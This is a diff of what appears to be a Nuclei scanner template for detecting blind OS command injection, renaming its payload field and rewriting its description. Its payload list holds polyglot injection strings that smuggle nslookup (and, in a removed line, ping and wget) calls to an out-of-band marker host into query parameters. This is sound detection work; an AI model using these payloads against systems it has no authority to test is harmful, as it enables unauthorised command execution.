@@ -1,7 +1,7 @@
 http:
 - fuzzing:
   - fuzz:
-    - '{{payload}}'
+    - '{{interaction}}'
     part: query
     type: postfix
   matchers:
@@ -9,29 +9,26 @@ http:
     type: word
     words:
     - dns
-  - part: interactsh_protocol
-    type: word
-    words:
-    - http
+  method: GET
+  path:
+  - '{{BaseURL}}'
   payloads:
-    payload:
+    interaction:
     - '&nslookup {{marker}}&''\"`0&nslookup {{marker}}&`'''
     - 1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}";nslookup${IFS}{{marker}};#${IFS}
     - '/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-''/*$(nslookup
       {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||''"||nslookup({{marker}})||"/*`*/'
-    - $(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)
-  pre-condition:
-  - dsl:
-    - method == "GET"
-    type: dsl
   stop-at-first-match: true
 id: cmdi-blind-oast-polyglot
 info:
-  author: pdteam,geeknik
-  description: 'Potential blind OS command injection vulnerabilities, where the application
-    constructs OS commands using unsanitized user input.
+  author: pdteam
+  description: 'OS Commanding is the direct result of mixing trusted code and untrusted
+    data.
 
-    Successful exploitation could lead to arbitrary command execution on the system.
+    This attack is possible when an application accepts untrusted input to build operating
+    system commands in an insecure manner involving improper data sanitization,
+
+    and/or improper calling of external programs.
 
     '
   name: Blind OS Command Injection
